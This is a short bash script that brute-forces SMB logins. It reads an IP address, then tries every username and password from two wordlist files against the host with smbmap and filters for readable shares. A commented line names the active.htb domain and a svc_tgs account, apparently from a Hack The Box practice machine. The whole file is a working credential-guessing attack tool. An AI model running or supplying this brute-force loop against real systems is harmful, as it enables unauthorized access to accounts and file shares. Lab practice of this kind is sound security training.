#!/bin/bash
read -p "Enter IP address: " ip

for user in $(cat usernames.txt)
do

	for pass in $(cat passwords.txt)
	do
		echo "Testing $user:$pass"
		#smbmap -d active.htb -u svc_tgs -p thepassword -H $ip
		smbmap -u $user -p $pass -H $ip | grep -i "READ"
	done

done

echo "If host is windows try with domain option"
